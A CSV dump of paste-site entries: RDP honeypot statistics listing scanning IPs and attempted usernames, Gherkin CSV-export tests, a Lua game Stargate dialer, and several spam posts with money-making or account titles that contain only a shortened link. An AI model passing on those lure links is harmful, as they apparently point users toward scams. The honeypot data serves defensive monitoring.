id,title,username,language,date,content
zgJ0Z1FC,Make $1000 15-MINUTES (BEGINNER) WM,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 07:19:05 PM CDT," 
Pdf https://tinyurl.com/methodssss


ao6ttSp4ht
"
6zYKKqcU,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:18:51 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67896,
    ""156.146.57.110"": 37164,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67896,
    ""AS212238"": 64902,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67896,
    ""Datacamp Limited"": 64902,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67896,
    ""Datacamp Limited"": 64902,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132798,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135339,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145392,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145515
  },
  ""client_build"": {
    ""Unknown"": 145515
  },
  ""client_name"": {
    ""Unknown"": 145515
  },
  ""ip_type"": {
    ""hosting & proxy"": 136107,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
3APRC9wP,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:16:28 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67895,
    ""156.146.57.110"": 37163,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67895,
    ""AS212238"": 64901,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67895,
    ""Datacamp Limited"": 64901,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67895,
    ""Datacamp Limited"": 64901,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132796,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135337,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145390,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145513
  },
  ""client_build"": {
    ""Unknown"": 145513
  },
  ""client_name"": {
    ""Unknown"": 145513
  },
  ""ip_type"": {
    ""hosting & proxy"": 136105,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
Neh6PhDH,2025-03-31_stats.json,rdp_snitch,JSON,Tuesday 1st of April 2025 07:15:17 PM CDT,"{
  ""ip"": {
    ""138.199.24.6"": 67894,
    ""156.146.57.110"": 37162,
    ""156.146.57.52"": 9234,
    ""156.146.57.188"": 1497,
    ""156.146.57.174"": 9279,
    ""150.95.89.149"": 9240,
    ""146.190.105.191"": 2532,
    ""217.160.21.137"": 15,
    ""106.14.144.233"": 435,
    ""157.245.156.139"": 3,
    ""188.166.250.11"": 6,
    ""156.146.57.118"": 2121,
    ""185.42.12.5"": 18,
    ""205.210.31.204"": 9,
    ""45.227.254.151"": 6,
    ""45.227.254.155"": 6,
    ""156.146.57.120"": 5607,
    ""157.245.104.150"": 15,
    ""147.185.132.31"": 9,
    ""178.20.129.235"": 3,
    ""167.94.145.104"": 3,
    ""147.182.229.114"": 324,
    ""185.147.124.165"": 18,
    ""205.210.31.151"": 9,
    ""94.131.11.211"": 9,
    ""66.235.169.197"": 6,
    ""118.193.59.10"": 3,
    ""61.219.85.85"": 3,
    ""194.165.16.167"": 6,
    ""134.209.221.100"": 12,
    ""139.177.201.185"": 3,
    ""194.165.16.162"": 6,
    ""103.97.93.115"": 9,
    ""198.235.24.114"": 9
  },
  ""asn"": {
    ""AS60068"": 67894,
    ""AS212238"": 64900,
    ""AS135161"": 9240,
    ""AS14061"": 2892,
    ""AS8560"": 15,
    ""AS37963"": 435,
    ""AS59425"": 18,
    ""AS396982"": 36,
    ""AS267784"": 12,
    ""AS24810"": 3,
    ""AS398705"": 3,
    ""AS49505"": 18,
    ""AS44477"": 9,
    ""AS40244"": 6,
    ""AS135377"": 3,
    ""AS3462"": 3,
    ""AS48721"": 12,
    ""AS63949"": 3,
    ""AS134053"": 9
  },
  ""isp"": {
    ""DataCamp Limited"": 67894,
    ""Datacamp Limited"": 64900,
    ""GMO-Z.COM PTE. LTD."": 9240,
    ""DigitalOcean, LLC"": 2892,
    ""IONOS SE"": 15,
    ""Hangzhou Alibaba Advertising Co"": 435,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 24,
    ""Teleset LLC Nchelny Branch"": 3,
    ""Censys, Inc."": 3,
    ""JSC Selectel"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""HopOne Internet Corporation"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""Akamai Technologies, Inc."": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""org"": {
    ""Cdn77 SGP"": 67894,
    ""Datacamp Limited"": 64900,
    ""Zcom Thai"": 9240,
    ""DigitalOcean, LLC"": 2886,
    ""Unknown"": 15,
    ""Aliyun Computing Co., LTD"": 435,
    ""Digitalocean"": 6,
    ""Horizon LLC"": 18,
    ""Palo Alto Networks, Inc"": 36,
    ""Xwin Universal LTD"": 12,
    ""Teleset LLC"": 3,
    ""Censys, Inc."": 3,
    ""Almira LLC"": 18,
    ""Stark Industries Solutions LTD"": 9,
    ""Tier.Net Technologies LLC"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Flyservers S.A"": 12,
    ""Linode"": 3,
    ""Ethernet Xpress Pvt. Ltd."": 9
  },
  ""regionName"": {
    ""North West"": 132794,
    ""Tokyo"": 9240,
    ""South West"": 2541,
    ""Madrid"": 15,
    ""Shanghai"": 435,
    ""Moscow"": 36,
    ""California"": 360,
    ""Vilnius"": 12,
    ""Karnataka"": 15,
    ""Tatarstan Republic"": 3,
    ""Michigan"": 3,
    ""Drenthe"": 9,
    ""New York"": 6,
    ""Hesse"": 3,
    ""New Taipei City"": 3,
    ""Kaunas"": 12,
    ""New Jersey"": 12,
    ""Georgia"": 3,
    ""Goa"": 9
  },
  ""country"": {
    ""Singapore"": 135335,
    ""Japan"": 9240,
    ""Spain"": 15,
    ""China"": 435,
    ""Russia"": 39,
    ""United States"": 384,
    ""Lithuania"": 24,
    ""India"": 24,
    ""The Netherlands"": 9,
    ""Germany"": 3,
    ""Taiwan"": 3
  },
  ""account"": {
    ""hello"": 145388,
    ""Test"": 42,
    ""McKwXyVcU"": 3,
    ""JcHzZh"": 3,
    ""LRvAEh"": 3,
    ""vCrcpeieA"": 3,
    ""KePovo"": 3,
    ""sypKLp"": 3,
    ""(empty)"": 3,
    ""Domain"": 24,
    ""QYfPXzmxi"": 3,
    ""SmlQOR"": 3,
    ""rZHSkG"": 3,
    ""Administrator"": 3,
    ""nngwygmx"": 12,
    ""beio"": 3,
    ""kFWRTtFSr"": 3,
    ""vMHDzE"": 3,
    ""SUZUGL"": 3
  },
  ""keyboard"": {
    ""Unknown"": 145511
  },
  ""client_build"": {
    ""Unknown"": 145511
  },
  ""client_name"": {
    ""Unknown"": 145511
  },
  ""ip_type"": {
    ""hosting & proxy"": 136103,
    ""hosting"": 9339,
    ""proxy"": 27,
    ""Unknown"": 42
  }
}"
HB5TfWXk,Binance account CW,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 07:03:11 PM CDT," 
Pdf https://tinyurl.com/methodssss


7rMjo5PHed
"
fgtD0DXB,EARN $900 INSTANTLY 2025 BT,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 06:47:10 PM CDT," 
Pdf https://tinyurl.com/methodssss


BMJkHXc98I
"
R7QjsTvt,Random Gmail Acc 1A,Xavdsvrfwfrewffsfsd,JavaScript,Tuesday 1st of April 2025 06:31:15 PM CDT," 
Pdf https://tinyurl.com/methodssss


iDfn4dkkqc
"
UJiq6cRy,users csv export feature test and implementation,4tolexx,GetText,Tuesday 1st of April 2025 06:13:20 PM CDT,"Feature: Export Users as CSV

  Background:
    Given a user ""User 1"" with:
      | id   | 1             |
      | name | Alex Barnsley |
    And a user ""User 2"" with:
      | id   | 2             |
      | name | Phil Thompson |
    And a role ""Authorized"" with permissions:
      | User    | read |
    And user ""User 1"" belongs to role ""Authorized""

  Scenario: Export users list as csv
    When I sign in as user ""User 1""
    And I browse to users list
    Then I see ""User 1""
    And I see ""User 2""
    When I click ""CSV""
    Then I download a CSV with content:
      | Id | Name          | Username | Sign in count | Failed attempts | Last sign in at | Password changed at | Locked at  | Created at | Updated at |
      | 1  | Alex Barnsley | User 1   | <INT>         | <INT>           | <ISO_DATE>      | <ISO_DATE>          | <EMPTY>    | <ISO_DATE> | <ISO_DATE> |
      | 2  | Phil Thompson | User 2   | <INT>         | <INT>           | <EMPTY>         | <ISO_DATE>          | <EMPTY>    | <ISO_DATE> | <ISO_DATE> |


csv do
    column :id
    column(:name) { |user| user.object.name }
    column(:username) { |user| user.object.username }
    column :sign_in_count
    column :last_sign_in_at
    column :failed_attempts
    column :password_changed_at
    column :locked_at
    column :updated_at
    column :created_at
  end
"
f3Fsqgwh,study csv export and implementation,4tolexx,GetText,Tuesday 1st of April 2025 06:05:51 PM CDT,"Feature: Export Studies as CSV

  Background:
    Given a study ""Study 1"" with:
      | id             | 1 		  |
      | state          | building |
      | locked_version | 1 		  |
    And a study ""Study 2"" with:
      | id             | 2 			|
      | state          | production |
      | locked_version | 2 			|

  Scenario: Export studies list as csv
    When I sign in as a user with all permissions
    And I browse to studies list
    Then I see ""Study 1""
    And I see ""Study 2""
    When I click ""CSV""
    Then I download a CSV with content:
      | Id | Name    | State      | Locked version | Created at | Updated at |
      | 1  | Study 1 | building   | 1              | <ISO_DATE> | <ISO_DATE> |
      | 2  | Study 2 | production | 2              | <ISO_DATE> | <ISO_DATE> |


  csv do
    column :id
    column(:name) { |study| study.object.name }
    column(:state) { |study| study.object.state }
    column :locked_version
    column :created_at
    column :updated_at
  end
"
b3MuJrtj,Stargate Controller Test 2,Alexr360,Lua,Tuesday 1st of April 2025 05:47:50 PM CDT,"interface = peripheral.find(""basic_interface"")

function dial(address)
    
    local addressLength = #address
    
    local start = interface.getChevronsEngaged() + 1
    
    for chevron = start, addressLength, 1
    do
        local symbol = address[chevron]
        
        if chevron % 2 == 0 then
            interface.rotateClockwise(symbol)
        else
            interface.rotateAntiClockwise(symbol)
        end
        
        while(not interface.isCurrentSymbol(symbol))
        do
            sleep(0)
        end
        
        sleep(1)
        interface.openChevron()
        sleep(1)

        interface.closeChevron()
        sleep(1)
    end 
end

abydosAddress = {26,6,14,31,11,29,0}

overworldAddress = {27, 25, 4, 35, 10, 28, 0}

cavumAddress = {18, 7, 3, 36, 25, 15, 0}

chulakAddress = {18,14,21,15,2,13,19,35,0}

othersideAddress = {10, 28, 17, 21, 3, 27, 0}

print(""Awaiting input:"")

print(""1 = Abydos"")
print(""2 = Overworld"")
print(""3 = Cavum Tenebrae"")
print(""4 = Chulak"")
print(""5 = Otherside"")

input = tonumber(io.read())
sleep(0)

if input == 1 then
    dial(abydosAddress)
elseif input == 2 then
    dial(overworldAddress)
elseif input == 3 then
    dial(cavumAddress)
elseif input == 4 then
    dial(chulakAddress)
elseif input == 5 then
    dial(othersideAddress)
else
    print(""Invalid input"")
end
"
